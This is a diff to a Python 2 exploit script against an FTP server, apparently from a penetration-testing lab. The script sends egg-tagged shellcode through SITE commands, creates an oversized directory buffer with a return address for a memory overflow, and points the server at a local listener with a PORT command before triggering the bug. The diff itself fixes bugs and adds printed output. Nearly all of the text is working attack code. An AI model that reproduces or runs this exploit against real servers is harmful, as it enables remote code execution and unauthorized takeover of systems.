@@ -119,7 +119,11 @@ def drop_shellcode(ftp_server, shellcode, egg):
         #data = sock.send("SITE " + egg + encoded_shellcode)
         #data = sock.recv(1024)
         #print data
-        ftp_server.sendcmd("SITE " + egg + encoded_shellcode)
+        try:
+            ftp_server.sendcmd("SITE " + egg + encoded_shellcode)
+        except:
+            pass
+        print "[+] Completed pass 1..."
         i = i+1
 
 def build_directory_buffer(egg,patch,ret):
@@ -168,14 +172,14 @@ def main():
         ftp_server = FTP()
         print "[+] Connecting to FTP Server: %s on port %d" % (ip, port)
         ftp_server.connect(ip,port,timeout=30)        
-        
-        print "[+] Connected! Waiting for welcome banner..."
-        print ftp.getwelcome()
-         
+                 
     except:
         print "[!] Could not connect to FTP Server: %s on port %d" % (ip, port)
         sys.exit(-1)
     
+    print "[+] Connected! Waiting for welcome banner..."
+    print ftp_server.getwelcome()
+
     #Attempt logon to FTP server
     print "[+] Attemping FTP Logon with creds: %s / %s" %(ftp_user, ftp_pass)
     try:
@@ -200,7 +204,8 @@ def main():
     #send overflow directory buffer
     print "[+] Creating long directory..."
     try:
-        ftp_server.mkd(d_buffer)
+        data = ftp_server.mkd(d_buffer)
+        print data
     except:
         print "[!] Unexpected response from FTP Server."
         print "[!] Most likely cause is that the user does not have write permissions to FTP root directory."
@@ -218,15 +223,18 @@ def main():
     #    print "[!] Exiting..."
     #    sys.exit(-1)
     #start TCP server for FTP server to connect to
-    srv = create_tcp_server()
+    print "[+] Starting local TCP server..."
+    srv = create_tcp_server(HOST="10.11.0.208",PORT=0)
     #get info for PORT address
     srv_port1 = srv.server_address[1] / 256
     srv_port2 = srv.server_address[1] % 256
     #build address for PORT command
-    srv_address = "%s,%s,%s" % (srv.server_address.replace(".",","), srv_port1, srv_port2)
-    
+    srv_address = "%s,%s,%s" % (str(srv.server_address[0]).replace(".",","), srv_port1, srv_port2)
+
     #send PORT command
-    ftp_server.sendcmd("PORT %s" % srv_address)
+    print "[+] Sending Port Command..."
+    data = ftp_server.sendcmd("PORT %s" % srv_address)
+    print data
     
     #trigger vulnerability
     dir_name = " %s*/../%s*/" % (d_buffer, pre)
